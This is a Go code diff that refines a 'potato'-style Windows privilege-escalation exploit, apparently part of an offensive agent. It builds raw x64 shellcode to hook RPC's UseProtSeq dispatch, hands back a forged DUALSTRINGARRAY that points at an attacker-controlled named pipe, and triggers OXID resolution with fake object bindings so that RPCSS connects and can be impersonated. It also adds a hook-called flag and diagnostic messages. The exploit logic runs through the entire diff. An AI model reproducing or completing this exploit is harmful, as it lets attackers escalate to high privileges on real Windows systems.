@@ -183,14 +183,18 @@ func buildPipeDSA(pipeUniqueName string) []byte {
 	return buf[:4+entriesCount*2]
 }
 
+// hookFlagOffset is the offset within the shellcode page where the hook-called
+// flag byte is stored. The shellcode sets this to 1 when UseProtSeq is called.
+const hookFlagOffset = 128
+
 // buildNativeHook creates a native x64 shellcode hook for the UseProtSeq dispatch.
 // Using raw shellcode instead of syscall.NewCallback avoids crashes caused by Go's
 // callback trampoline interacting with the NDR interpreter's RPC dispatch thread.
-// The shellcode simply reads ppdsaNewBindings from the correct parameter position,
-// writes the pre-allocated DSA buffer address, and returns 0.
+// The shellcode reads ppdsaNewBindings from the correct parameter position,
+// writes the pre-allocated DSA buffer address, sets a flag, and returns 0.
 func buildNativeHook(paramCount int, dsaBufAddr uintptr) (hookAddr uintptr, err error) {
 	ppdsaIndex := paramCount - 2
-	code := make([]byte, 0, 64)
+	code := make([]byte, 0, 80)
 
 	// Step 1: Load ppdsaNewBindings into RAX from the correct parameter position.
 	// x64 Windows calling convention: RCX=p0, RDX=p1, R8=p2, R9=p3, stack=p4+
@@ -212,8 +216,11 @@ func buildNativeHook(paramCount int, dsaBufAddr uintptr) (hookAddr uintptr, err 
 	// Step 2: test rax, rax — check for null pointer
 	code = append(code, 0x48, 0x85, 0xC0)
 
-	// Step 3: jz done — skip write if null (jump 13 bytes over mov+mov)
-	code = append(code, 0x74, 0x0D)
+	// Step 3: jz done — skip writes if null (jump over DSA write + flag write)
+	// DSA write: mov rcx, imm64 (10) + mov [rax], rcx (3) = 13
+	// Flag write: mov rax, imm64 (10) + mov byte [rax], 1 (3) = 13
+	// Total: 26 bytes
+	code = append(code, 0x74, 0x1A) // jz done (jump 26 bytes)
 
 	// Step 4: mov rcx, <dsaBufAddr> — load pre-allocated DSA address
 	addrBytes := make([]byte, 8)
@@ -224,11 +231,20 @@ func buildNativeHook(paramCount int, dsaBufAddr uintptr) (hookAddr uintptr, err 
 	// Step 5: mov [rax], rcx — write DSA address to *ppdsaNewBindings
 	code = append(code, 0x48, 0x89, 0x08)
 
+	// Step 6: Set hook-called flag at page+hookFlagOffset
+	// mov rax, <flagAddr> — will be patched after VirtualAlloc
+	code = append(code, 0x48, 0xB8) // mov rax, imm64
+	flagAddrSlot := len(code)        // remember where to patch
+	code = append(code, 0, 0, 0, 0, 0, 0, 0, 0)
+
+	// mov byte [rax], 1
+	code = append(code, 0xC6, 0x00, 0x01)
+
 	// done:
-	// Step 6: xor eax, eax — return 0 (RPC_S_OK)
+	// Step 7: xor eax, eax — return 0 (RPC_S_OK)
 	code = append(code, 0x33, 0xC0)
 
-	// Step 7: ret
+	// Step 8: ret
 	code = append(code, 0xC3)
 
 	// Allocate executable memory and copy shellcode
@@ -238,11 +254,24 @@ func buildNativeHook(paramCount int, dsaBufAddr uintptr) (hookAddr uintptr, err 
 		return 0, fmt.Errorf("VirtualAlloc for hook shellcode: %v", allocErr)
 	}
 
+	// Patch the flag address now that we know the page address
+	flagAddr := page + hookFlagOffset
+	binary.LittleEndian.PutUint64(code[flagAddrSlot:], uint64(flagAddr))
+
 	dst := unsafe.Slice((*byte)(unsafe.Pointer(page)), len(code))
 	copy(dst, code)
 
 	potatoGlobal.shellcodePage = page
 	return page, nil
+}
+
+// wasHookCalled checks the shellcode flag byte to determine if UseProtSeq was triggered.
+func wasHookCalled() bool {
+	if potatoGlobal.shellcodePage == 0 {
+		return false
+	}
+	flag := *(*byte)(unsafe.Pointer(potatoGlobal.shellcodePage + hookFlagOffset))
+	return flag != 0
 }
 
 // allocateDSAOnHeap allocates the DUALSTRINGARRAY on the process heap using HeapAlloc.
@@ -524,14 +553,17 @@ func doPotatoExploit(oldIdentity string, phase *int32) structs.CommandResult {
 	waitResult, _ := windows.WaitForSingleObject(event, 10000) // 10s timeout
 	if waitResult != windows.WAIT_OBJECT_0 {
 		hookStatus := "NOT called"
-		if potatoGlobal.hookCalled {
-			hookStatus = "called"
+		if wasHookCalled() {
+			hookStatus = "CALLED (DSA returned but RPCSS didn't connect)"
 		}
 		bindingStr := "ncacn_np:localhost/pipe/" + pipeUniqueName + `[\pipe\epmapper]`
-		errMsg := fmt.Sprintf("RPCSS did not connect to pipe within timeout.\nPipe: %s\nBinding: %s\nHook was %s (paramCount=%d)\nDSA size: %d bytes",
-			pipeName, bindingStr, hookStatus, paramCount, len(potatoGlobal.precomputedDSA))
+		errMsg := fmt.Sprintf("RPCSS did not connect to pipe within timeout.\nPipe: %s\nBinding: %s\nHook was %s (paramCount=%d)\nDSA size: %d bytes\nOXID: %x\nOID: %x\nIPID: %x",
+			pipeName, bindingStr, hookStatus, paramCount, len(potatoGlobal.precomputedDSA),
+			oxid, oid, ipid)
 		if triggerErr != nil {
 			errMsg += fmt.Sprintf("\nTrigger: %v", triggerErr)
+		} else {
+			errMsg += "\nTrigger: completed (no error)"
 		}
 		return structs.CommandResult{
 			Output:    errMsg,
@@ -882,9 +914,12 @@ func triggerOXIDResolution(oxid [8]byte, oid [8]byte, ipid [16]byte) error {
 		comRelease(punk)
 	}
 
-	// CoUnmarshalInterface will likely return an error (the object's bindings
-	// are fake), but the side effect of triggering OXID resolution is what we want.
-	_ = ret
+	// CoUnmarshalInterface may return an error (the object's bindings are fake),
+	// but the side effect of triggering OXID resolution is what we want.
+	// Return the HRESULT for diagnostic purposes.
+	if ret != 0 {
+		return fmt.Errorf("CoUnmarshalInterface hr=0x%08x", ret)
+	}
 	return nil
 }
 
